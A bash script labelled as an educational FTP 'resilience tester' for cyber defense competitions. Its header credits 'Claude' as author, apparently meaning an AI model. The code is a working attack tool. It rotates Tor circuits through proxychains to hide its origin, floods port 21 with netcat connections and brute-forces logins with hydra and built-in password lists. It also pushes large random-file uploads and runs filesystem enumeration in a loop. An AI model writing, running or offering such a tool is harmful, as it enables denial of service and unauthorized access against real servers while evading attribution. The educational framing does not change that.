#!/bin/bash
# Ubuntu_FTP_Tester.sh
# Purpose: Educational script to test FTP service resilience
# Usage: ./Ubuntu_FTP_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y ftp lftp python3-pip tor proxychains hydra netcat-openbsd

# Install Python packages
pip3 install PySocks pyftpdlib

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 30" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 15" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Generate a list of common FTP usernames and passwords
cat > ftp_users.txt << EOF
anonymous
ftp
admin
user
ftpuser
test
EOF

cat > ftp_passwords.txt << EOF
anonymous
password
admin
test123
P@ssw0rd
EOF

# Create a test file for uploads
dd if=/dev/urandom of=random_file.bin bs=1M count=10

echo "[*] Beginning Ubuntu FTP service resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Create FTP command script for connection testing
cat > ftp_commands.txt << EOF
user anonymous anonymous
cd /
ls -la
pwd
cd ..
ls -la
quit
EOF

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 30 seconds
  if [ $(( $(date +%s) % 30 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. FTP connection flooding
  echo "[*] Testing FTP connection handling..."
  for i in {1..20}; do
    (
      proxychains nc $TARGET_IP 21 < /dev/null &
      sleep 0.2
      kill $! 2>/dev/null
    ) &
    sleep 0.1
  done
  
  # 2. Authentication testing with hydra
  echo "[*] Testing FTP authentication handling..."
  timeout 30s proxychains hydra -L ftp_users.txt -P ftp_passwords.txt $TARGET_IP ftp &
  
  # 3. Anonymous FTP testing
  echo "[*] Testing anonymous FTP access..."
  proxychains ftp -n $TARGET_IP 21 < ftp_commands.txt &
  
  # 4. Large file upload attempts
  echo "[*] Testing FTP upload capacity..."
  for i in {1..3}; do
    proxychains lftp -c "open $TARGET_IP; user anonymous anonymous; put random_file.bin -o /pub/test_file_$i.bin" &
    sleep 2
  done
  
  # 5. Simultaneous connections with lftp
  echo "[*] Testing simultaneous connection handling..."
  for i in {1..5}; do
    proxychains lftp -c "open $TARGET_IP; user anonymous anonymous; ls -la; find /" &
    sleep 1
  done
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
  
  # Clean up zombie processes
  pkill -f "hydra" 2>/dev/null
  pkill -f "ftp" 2>/dev/null
  pkill -f "lftp" 2>/dev/null
  pkill -f "nc" 2>/dev/null
done

# Cleanup
rm -f ftp_users.txt ftp_passwords.txt random_file.bin ftp_commands.txt
echo "[*] Test completed at: $(date)"
